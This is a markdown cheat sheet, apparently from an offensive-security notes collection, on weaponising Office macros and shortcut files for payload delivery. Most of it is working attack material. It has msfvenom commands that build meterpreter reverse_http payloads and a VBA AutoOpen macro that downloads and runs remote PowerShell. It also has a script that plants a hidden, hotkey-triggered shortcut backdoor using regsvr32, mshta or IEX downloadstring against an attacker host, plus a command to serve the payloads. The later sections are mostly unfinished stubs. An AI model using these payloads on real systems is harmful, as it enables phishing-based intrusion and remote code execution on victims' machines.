# Payload Delivery Macro

## 01 - Manual

### 1.1 - Use Cases

Refer to the [[Payload Delivery|payload delivery scripts]] helpers section.

#### 1.1.1 - VBA Macro

`$ msfvenom -p windows/x64/meterpreter/reverse_http lhost=<IP> lport=80 -f vba-psh -o macro.vbs`

#### 1.1.2 - HTA Callback Shell

`$ msfvenom -p windows/x64/meterpreter/reverse_http lhost=<IP> lport=80 -f hta-psh -o hta-payload.hta`

#### 1.1.3 - Shortcut Link

`$ cat macro.vbs`

---

```vbscript
Sub AutoOpen()
    Shell("powershell -c ""(Invoke-WebRequest ""http://<IP>/pwsh_cmds.txt"").Content | powershell"" ")
End Sub
```

Note: The TargetPath has a limit of 260 characters long

`$ cat pwsh_cmds.txt`

---

```powershell
$shortcutPath = "C:\Users\" + $env:username + "\Desktop\mal.lnk"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($shortcutPath)

## Scriptlet files .sct
$Shortcut.TargetPath = 'C:\Windows\System32\cmd.exe'
$Shortcut.Arguments = '/c regsvr32 /s /n /u /i:http://<IP>/shell.sct scrobj.dll'

# For HTA files
# $Shortcut.TargetPath = 'C:\Windows\System32\mshta.exe'
# $Shortcut.Arguments = 'http://<IP>/shell.hta'

# For conhost.exe and powershell one-liner
# $Shortcut.TargetPath = 'cmd'
# $Shortcut.Arguments = "/k `"powershell.exe -nop -NonI -Nologo -w hidden -c `"IEX ((new-object net.webclient).downloadstring(`'http://<IP>/shell.ps1`'))`"`""
$Shortcut.Description = "A shortcut backdoor"
# $Shortcut.IconLocation = 'C:\path\to\icon.ico'
$Shortcut.IconLocation = 'shell32.dll,21'
$Shortcut.hotkey = 'CTRL+C' # A hotkey to trigger the payload
$Shortcut.WindowStyle = 7
$Shortcut.WorkingDirectory = "C:\Users\" + $env:username + "\Public"
$Shortcut.Save()
attrib +h $shortcutPath
```

`$ sudo python -m http.server 80`

## 02 - Automated

### 2.1 - Metasploit

### 2.2 - Cobalt Strike

TODO: Showcase cobalt strike macro generator

### 2.3 - LuckyStrike

### 2.3.1 - Setup

TODO: Show the steps to install LuckyStrike

#### 2.3.2 - Usage

TODO: Showcase LuckyStrike usage by generating a macro

### 2.4 - Setoolkit

---
## References

- [LuckyStrike](https://github.com/curi0usJack/luckystrike)

- [LuckyStrike Usage Details](https://www.sevenlayers.com/index.php/293-luckystrike)

- [Lab 3 LuckyStrike Macro Generator](https://pythonforcybersecurity.com/lessons/lab-3-luckystrike-macro-generator/)

- [Getting System Access Using Malicious Word File](https://niiconsulting.com/checkmate/2017/05/getting-system-access-using-malicious-word-file/)

- [Phishing Files and Documents](https://book.hacktricks.xyz/generic-methodologies-and-resources/phishing-methodology/phishing-documents)

- [Multiple Ways to Exploit Windows Systems using Macros](https://www.hackingarticles.in/multiple-ways-to-exploit-windows-systems-using-macros/)

- [MS Excel Weaponization Techniques](https://bank-security.medium.com/ms-excel-weaponization-techniques-79ac51610bf5)

- [Metasploit Module of the Month Web Delivery](https://warroom.rsmus.com/metasploit-module-of-the-month-web_delivery/)

- [Various Macros-Based RCEs](https://gist.github.com/mgeeky/9dee0ac86c65cdd9cb5a2f64cef51991)